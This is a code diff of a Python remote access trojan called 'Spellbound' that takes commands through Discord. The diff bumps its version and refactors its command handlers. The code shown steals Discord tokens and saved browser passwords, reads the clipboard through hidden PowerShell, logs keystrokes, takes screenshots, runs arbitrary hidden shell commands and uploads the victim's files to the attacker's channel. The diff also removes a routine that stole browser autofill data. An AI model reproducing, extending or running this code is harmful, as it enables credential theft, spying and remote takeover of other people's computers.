@@ -16,7 +16,7 @@ import threading
 import subprocess
 import ctypes.wintypes
 
-VERSION = "1.0"
+VERSION = "3.5"
 PYTHON_CMD = sys.executable
 
 class log:
@@ -72,7 +72,6 @@ discordUIDS = []
 discordCommonPaths = {'Discord': ROAMING + '\\discord\\Local Storage\\leveldb\\','Discord Canary': ROAMING + '\\discordcanary\\Local Storage\\leveldb\\','Lightcord': ROAMING + '\\Lightcord\\Local Storage\\leveldb\\','Discord PTB': ROAMING + '\\discordptb\\Local Storage\\leveldb\\','Opera': ROAMING + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo': LOCALAPPDATA + '\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch': LOCALAPPDATA + '\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa': LOCALAPPDATA + '\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum': LOCALAPPDATA + '\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser': LOCALAPPDATA + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star': LOCALAPPDATA + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik': LOCALAPPDATA + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi': LOCALAPPDATA + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS': LOCALAPPDATA + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser': LOCALAPPDATA + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge': LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\','Uran': LOCALAPPDATA + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex': LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave': LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium': LOCALAPPDATA + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
 
 browsersPasswords = []
-browserAutofill = []
 chromiumBrowsers = [{"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},{"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},{"name": "Opera", "path": os.path.join(ROAMING, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},{"name": "Opera GX", "path": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},{"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},{"name": "Yandex", "path": os.path.join(ROAMING, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},]
 chromiumSubpaths = [{"name": "None", "path": ""},{"name": "Default", "path": "Default"},{"name": "Profile 1", "path": "Profile 1"},{"name": "Profile 2", "path": "Profile 2"},{"name": "Profile 3", "path": "Profile 3"},{"name": "Profile 4", "path": "Profile 4"},{"name": "Profile 5", "path": "Profile 5"},]
 
@@ -108,10 +107,7 @@ def KillProcess(processName):
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
 # ==================================================================================================================================================================================================================== #
 def GetClipboard():
-    if pyperclip.paste() != "":
-        return f"Last item copied :\n```{pyperclip.paste()}```"
-    else:
-        return ":warning: Empty clipboard !"
+    return subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode(errors="ignore").strip()
 
 class LASTINPUTINFO(ctypes.Structure):
     _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
@@ -363,46 +359,6 @@ def ExtractPasswords():
                 log.error(f"Failed to extract password :: {e}")
                 continue
 
-def ExtractAutofill():
-    for browser in chromiumBrowsers:
-            KillProcess(browser["name"])
-            browser_path = browser["path"]
-            if not os.path.exists(browser_path):
-                continue
-
-            for profile in chromiumSubpaths:
-                profile_path = os.path.join(browser_path, profile["path"])
-                web_data_path = os.path.join(profile_path, "Web Data")
-
-                if os.path.exists(web_data_path):
-                    temp_copy = web_data_path + "_temp"
-                    shutil.copy2(web_data_path, temp_copy)
-
-                    try:
-                        conn = sqlite3.connect(temp_copy)
-                        cursor = conn.cursor()
-
-                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
-                        tables = [table[0] for table in cursor.fetchall()]
-                        if "autofill" in tables:
-                            cursor.execute("SELECT name, value FROM autofill")
-                            autofills = cursor.fetchall()
-
-                            for autofill in autofills:
-                                autofill_entry = (
-                                    f'Name: {autofill[0]}\n'
-                                    f'Value: {autofill[1]}\n'
-                                    f"Browser: {browser['name']}\n"
-                                    '==============\n'
-                                )
-                                browserAutofill.append(autofill_entry)
-
-                        conn.close()
-                    except sqlite3.Error as e:
-                        pass
-                    finally:
-                        os.remove(temp_copy)
-
 
 # ______________________________________________________________________________________________________________________________________________________ #
 # ================================================================= KEYLOGGER FUNCS ==================================================================== #
@@ -451,11 +407,12 @@ class Client(discord.Client):
 
             if currentCommandSession is None:
                 newCommandChannel = await guild.create_text_channel(GetMACFormatedForDiscord())
-                embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{VERSION}`", color=discord.Color.blue())
+                await newCommandChannel.purge()
+                embed = discord.Embed(description=f":wireless: New session open (agent version : `v{VERSION}`)", color=discord.Color.blue())
                 await newCommandChannel.send(embed=embed)
-                log.info("New command channel created")
             else:
-                embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{VERSION}`", color=discord.Color.blue())
+                await currentCommandSession.purge()
+                embed = discord.Embed(description=f":wireless: New session open (agent version : `v{VERSION}`)", color=discord.Color.blue())
                 await currentCommandSession.send(embed=embed)
 
             # ****** Other channel ****** #
@@ -484,7 +441,7 @@ class Client(discord.Client):
             if message.content == ".ping":
                 await message.delete()
                 
-                embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{VERSION}`", color=discord.Color.blue())
+                embed = discord.Embed(description=f":wireless: Session status : `alive`", color=discord.Color.blue())
                 await message.channel.send(embed=embed)
 
             # ____________________________________________________________________________________________________________________________________________ #
@@ -492,7 +449,7 @@ class Client(discord.Client):
             elif message.content == ".help":
                 await message.delete()
 
-                embed = discord.Embed(description=f"**Help Menu :**\n- `.ping` : Show connected devices\n- `.clear` : Clear the current text channel\n- `.kill <process.exe>` : Kill process\n- `.clipboard` : Show copied elements\n- `.grab autofill` : Grab autofill field from web browser\n- `.grab discord` : Grab user's Discord informations\n- `.grab password` : Grab passwords from web browser\n- `.system` : Grab PC informations\n- `.screenshot` : Take a screenshot\n- `.start keylogger` : Start the keylogger\n- `.stop keylogger` : Stop the keylogger and send keys pressed\n- `.cd <path>` : Change  the working directory\n- `.shell <cmd>` : Execute cmd commands\n- `.download <path/to/file>` : Download a file from the computer\n- `.idle` : Show in secondes the afk time", color=discord.Color.blue())
+                embed = discord.Embed(description=f"**Help Menu :**\n- `.ping` : Show connected devices\n- `.clear` : Clear the current text channel\n- `.kill <process.exe>` : Kill process\n- `.clipboard` : Show copied elements\n- `.grab discord` : Grab user's Discord informations\n- `.grab password` : Grab passwords from web browser\n- `.system` : Grab PC informations\n- `.screenshot` : Take a screenshot\n- `.start keylogger` : Start the keylogger\n- `.stop keylogger` : Stop the keylogger and send keys pressed\n- `.cd <path>` : Change  the working directory\n- `.sh <cmd>` : Execute cmd commands\n- `.download <path/to/file>` : Download a file from the computer\n- `.idle` : Show in secondes the afk time", color=discord.Color.blue())
                 await message.channel.send(embed=embed)
 
             # _____________________________________________________________________________________________________________________________________________ #
@@ -505,45 +462,28 @@ class Client(discord.Client):
             elif message.content.startswith(".kill"):
                 await message.delete()
 
-                command = message.content.split(" ")
+                command = message.content.replace(".kill ", "", 1)
 
                 try:
-                    KillProcess(command[1])
-                    embed = discord.Embed(description=f":white_check_mark: Process `{command[1]}` terminated !", color=discord.Color.green())
+                    KillProcess(command)
+                    embed = discord.Embed(description=f":small_red_triangle_down: Process `{command}` terminated", color=discord.Color.red())
                     await message.channel.send(embed=embed)
                 except:
-                    embed = discord.Embed(description=f":no_entry: Cannot terminate process `{command[1]}`", color=discord.Color.red())
+                    embed = discord.Embed(description=f":no_entry: Cannot terminate process `{command}`", color=discord.Color.red())
                     await message.channel.send(embed=embed)
 
             # _________________________________________________________________________________________________________________________________________________ #
             # ================================================================== .clipboard =================================================================== #
             elif message.content == ".cb" or message.content == ".clipboard":
                 await message.delete()
+
+                clipboard = GetClipboard()
+                file_path = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
+                with open(file_path, "w") as f:
+                    f.write(clipboard)
                 
-                embed = discord.Embed(description=GetClipboard(), color=discord.Color.green())
-                await message.channel.send(embed=embed)
-
-            # _____________________________________________________________________________________________________________________________________________________ #
-            # ================================================================= .grab autofill ==================================================================== #
-            elif message.content == ".grab autofill":
-                await message.delete()
-                
-                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                embed_sent = await message.channel.send(embed=embed)
-
-                ExtractAutofill()
-
-                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
-                with open(filePath, "w") as f:
-                    for autofill in browserAutofill:
-                        f.write(autofill)
-
-                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Auto-fill.txt")
-                await message.channel.send(file=fileEmbed)
-
-                await embed_sent.delete()
-
-                SafeRemove(filePath)
+                file_embed = discord.File(file_path, filename=f"{os.getlogin()} - Clipboard.txt")
+                await message.channel.send(file=file_embed)
 
             # ____________________________________________________________________________________________________________________________________________________ #
             # =================================================================== .grab discord ================================================================== #
@@ -556,17 +496,17 @@ class Client(discord.Client):
                 GetDiscordTokens()
                 tokens = ExtractInfosFromToken()
 
-                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
-                with open(filePath, "w") as f:
+                file_path = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
+                with open(file_path, "w") as f:
                     for token in tokens:
                         f.write(token)
 
-                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Discord Tokens.txt")
-                await message.channel.send(file=fileEmbed)
+                file_embed = discord.File(file_path, filename=f"{os.getlogin()} - Discord Tokens.txt")
+                await message.channel.send(file=file_embed)
 
                 await embed_sent.delete()
 
-                SafeRemove(filePath)
+                SafeRemove(file_path)
 
             # _____________________________________________________________________________________________________________________________________________________ #
             # =================================================================== .grab password ================================================================== #
@@ -585,16 +525,16 @@ class Client(discord.Client):
                         f"Password:       {entry['password']}\n"
                         f"==============\n")
 
-                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
-                with open(filePath, "w") as f:
+                file_path = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
+                with open(file_path, "w") as f:
                     f.write(formatted)
 
-                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Passwords.txt")
-                await message.channel.send(file=fileEmbed)
+                file_embed = discord.File(file_path, filename=f"{os.getlogin()} - Passwords.txt")
+                await message.channel.send(file=file_embed)
 
                 await embed_sent.delete()
 
-                SafeRemove(filePath)
+                SafeRemove(file_path)
 
             # _______________________________________________________________________________________________________________________________________________ #
             # =================================================================== .system ================================================================== #
@@ -621,7 +561,7 @@ class Client(discord.Client):
                 cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850").stdout.strip().split('\n')[2]
                 ram = subprocess.run(["powershell", "-Command", "Get-Process | Measure-Object -Property WorkingSet64 -Sum | ForEach-Object { \"{0:N2} MB\" -f ($_.Sum / 1MB) }"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850").stdout.strip()
 
-                embed = discord.Embed(description="", color=discord.Color.from_rgb(255, 255, 255))
+                embed = discord.Embed(description="", color=discord.Color.blue())
                 embed.add_field(name=":computer: **Global Info**", value=f"```ansi\n{blue}Computer@Username{reset} : {computer_name}@{session}\n{blue}Operative System{reset} : {os_version}\n{blue}Architecture{reset} : {architecture}\n{blue}Idle Time{reset} : {GetIdleTime()}s```", inline=True)
                 embed.add_field(name=":floppy_disk: **Hardware**", value=f"```ansi\n{blue}RAM{reset} : {ram}\n{blue}CPU{reset} : {cpu}```", inline=True)
                 embed.add_field(name=":satellite: **Network Info**", value=f"```ansi\n{blue}Public IP{reset} : {ip}\n{blue}MAC{reset} : {mac}\n{blue}Country{reset} : {country}\n{blue}Region{reset} : {region}\n{blue}City{reset} : {city}\n{blue}Localisation{reset} : {loc}\n{blue}Internet Provider{reset} : {org}```", inline=False)
@@ -639,8 +579,8 @@ class Client(discord.Client):
                 
                 Screenshot()
 
-                fileEmbed = discord.File(f"{CONTAINER_FOLDER_PATH}\\{os.getlogin()} - Screenshot.png", filename=f"{os.getlogin()} - Screenshot.png")
-                await message.channel.send(file=fileEmbed)
+                file_embed = discord.File(f"{CONTAINER_FOLDER_PATH}\\{os.getlogin()} - Screenshot.png", filename=f"{os.getlogin()} - Screenshot.png")
+                await message.channel.send(file=file_embed)
 
                 await embed_sent.delete()
 
@@ -652,12 +592,12 @@ class Client(discord.Client):
                 await message.delete()
 
                 if keyloggerStatut:
-                    embed = discord.Embed(description=f":no_entry: Keylogger already **ON** : use `.stop keylogger`", color=discord.Color.red())
+                    embed = discord.Embed(description=f":no_entry: Keylogger already activated : use `.stop keylogger`", color=discord.Color.red())
                     await message.channel.send(embed=embed)
                     return
                 
                 keyloggerStatut = True
-                embed = discord.Embed(description=f":warning: Keylogger has started, now listening...", color=discord.Color.yellow())
+                embed = discord.Embed(description=f":keyboard: Keylogger has started", color=discord.Color.blue())
                 await message.channel.send(embed=embed)
 
             elif message.content == ".stop keylogger":
@@ -668,26 +608,26 @@ class Client(discord.Client):
                     await message.channel.send(embed=embed)
                     return
 
-                embed = discord.Embed(description=f":warning: Keylogger is stopped !", color=discord.Color.yellow())
+                embed = discord.Embed(description=f":keyboard: Keylogger is stopped !", color=discord.Color.red())
                 await message.channel.send(embed=embed)
                 keyloggerStatut = False
 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                 embed_sent = await message.channel.send(embed=embed)
                 
-                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
+                file_path = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
                 finalMessage = ""
                 for key in keyloggerPressedKeys:
                     finalMessage += key
-                with open(filePath, "w") as f:
+                with open(file_path, "w") as f:
                     f.write(finalMessage)
 
-                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Keylogger Logs.txt")
-                await message.channel.send(file=fileEmbed)
+                file_embed = discord.File(file_path, filename=f"{os.getlogin()} - Keylogger Logs.txt")
+                await message.channel.send(file=file_embed)
 
                 await embed_sent.delete()
 
-                SafeRemove(filePath)
+                SafeRemove(file_path)
 
             # __________________________________________________________________________________________________________________________________________ #
             # =================================================================== .cd ================================================================== #
@@ -699,7 +639,7 @@ class Client(discord.Client):
                 try:
                     os.chdir(command)
                     cmdDirectory = os.getcwd()
-                    embed = discord.Embed(description=f"Current working directory changed to `{os.getcwd()}`", color=discord.Color.green())
+                    embed = discord.Embed(description=f"Current working directory changed to `{os.getcwd()}`", color=discord.Color.blue())
                     await message.channel.send(embed=embed)
                 except:
                     embed = discord.Embed(description=f":no_entry: Unkown directory : `{command}`", color=discord.Color.red())
@@ -707,14 +647,13 @@ class Client(discord.Client):
 
             # _____________________________________________________________________________________________________________________________________________ #
             # =================================================================== .shell ================================================================== #
-            elif message.content.startswith(".shell") or message.content.startswith(".sh"):
+            elif message.content.startswith(".sh"):
                 await message.delete()
 
-                command = message.content.split(" ")
+                command = message.content.replace(".sh ", "", 1)
 
                 try:
-                    finalCommand = ["cmd", "/c"]
-                    finalCommand.extend(command[1:])
+                    finalCommand = ["cmd", "/c", command]
 
                     result = subprocess.run(finalCommand, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850")
                     if result != "" or result != " ":
@@ -741,9 +680,9 @@ class Client(discord.Client):
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                 embed_sent = await message.channel.send(embed=embed)
 
-                filePath = command[1]
-                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - {os.path.basename(filePath)}")
-                await message.channel.send(file=fileEmbed)
+                file_path = command[1]
+                file_embed = discord.File(file_path, filename=f"{os.getlogin()} - {os.path.basename(file_path)}")
+                await message.channel.send(file=file_embed)
 
                 await embed_sent.delete()
 
